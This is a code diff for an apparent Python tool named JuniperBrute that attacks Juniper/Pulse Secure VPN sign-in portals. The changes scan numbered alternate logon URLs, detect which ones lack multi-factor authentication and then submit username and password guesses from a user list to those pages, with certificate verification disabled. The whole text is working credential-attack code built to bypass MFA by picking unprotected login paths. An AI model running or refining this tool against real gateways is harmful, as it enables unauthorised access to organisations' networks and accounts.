@@ -8,36 +8,35 @@ from argparse import ArgumentParser
 
 class JuniperBrute():
     ignore = ['tz_offset','btnSubmit']
-    def urlCheck(self, config, c):
+    URLS = []
+    nomfaurls = []
+    def urlCheck(self, config, c, URL):
         print("[!] Checking for other logon pages...")
-        for n in range(1, 100):
+        for n in range(1, 20):
             URL = 'url_' + str(n)
-            print("[!]  Trying " + config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL)
-            u = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=True)
-            print u
+            u = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
             if u.status_code == 200:
-                print "URL Found..." + config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL
-                self.MFACheck(c, config, URL)
-                if self.MFACheck:
-                    self.urlCheck(config, c)
-                else:
-                    break
-            else:
-                print("Moving on...")
+                self.URLS.append(URL)
+
     def MFACheck(self, c, config, URL):
-        print("[!] Checking to see if MultiFactor Authentication is required...")
-        mfa = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=True)
+        print("[!] Checking to see if MultiFactor Authentication is required for " + URL + "...")
+        mfa = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
         m = re.findall('<input (.*?)>', mfa.text, re.DOTALL)
         n = re.findall('password.[0-9]', str(m))
         if n:
-            print("[-]  MultiFactor Authentication Required! Checking to see if any other URLs require MFA...")
+            print("[-]  MultiFactor Authentication Required for " + URL + "!")
             return True
         else:
             print("[+]  MultiFactor Authentication is not on. Continuing...")
+            self.nomfaurls.append(URL)
             return False
-    def connectTest(self, config, payload):
+    def connectTest(self, config, payload, URL):
         with session() as c:
-            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/login.cgi', data=payload, allow_redirects=False, verify=True)
+            if 'url_default' in self.nomfaurls:
+                URL = 'url_default'
+            else:
+                URL = self.nomfaurls[0]
+            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/login.cgi', data=payload, allow_redirects=False, verify=False)
             m = re.search('p=user-confirm', str(cpost.headers))
             if m:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
@@ -46,7 +45,7 @@ class JuniperBrute():
     def payload(self, config):
         with session() as c:
             requests.packages.urllib3.disable_warnings()
-            cget = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/welcome.cgi', allow_redirects=True, verify=True)
+            cget = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/welcome.cgi', allow_redirects=True, verify=False)
             if cget.cookies:
                 URL = cget.cookies['DSSIGNIN']
             else:
@@ -61,29 +60,36 @@ class JuniperBrute():
             else:
                 print("[+]  No realms available...")
                 realm = ""
-            MFAused = self.MFACheck(c, config)
+            MFAused = self.MFACheck(c, config, URL)
             #Check for existence of a second factor MFACheck()
             #if MFACheck() returns TRUE, run urlCheck()
             if MFAused:
                 self.urlCheck(config, c, URL)
-        if config["UserFile"]:
-            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-            for line in lines:
-                config["USERNAME"] = line.strip('\n')
-                payload = {
+                for URL in self.URLS:
+                    self.MFACheck(c, config, URL)
+            else:
+                self.nomfaurls.append('url_default')
+        if self.nomfaurls:
+            if config["UserFile"]:
+                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                for line in lines:
+                    config["USERNAME"] = line.strip('\n')
+                    payload = {
                     'tz_offset': '-360',
                     'username': config["USERNAME"],
                     'password': config["PASSWORD"],
                     'realm': realm,
                     'btnSubmit': 'Sign+In'
                     }
-                #self.connectTest(config, payload)
-        else:
-            payload = {
+                    self.connectTest(config, payload, URL)
+            else:
+                payload = {
                 'tz_offset': '-360',
                 'username': config["USERNAME"],
                 'password': config["PASSWORD"],
                 'realm': realm,
                 'btnSubmit': 'Sign+In'
-            }
-            self.connectTest(config, payload)
+                }
+                self.connectTest(config, payload, URL)
+        else:
+            print "[-] All pages require MFA. Aborting..."
